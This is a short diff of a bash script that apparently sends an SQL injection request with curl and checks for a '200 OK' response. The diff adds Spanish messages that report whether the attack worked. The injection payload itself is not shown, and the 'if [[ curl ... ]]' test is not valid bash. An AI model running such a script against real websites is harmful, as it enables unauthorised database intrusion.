@@ -6,6 +6,8 @@ ATTACK="$URL$SQLi"
 curl -i $ATTACK | grep "200 OK"
 if [[ curl -i $ATTACK | grep "200 OK" ]]
 then
+  echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
 else
+  echo "Disculpa, el ataque no ha funcionado."
 fi
 }
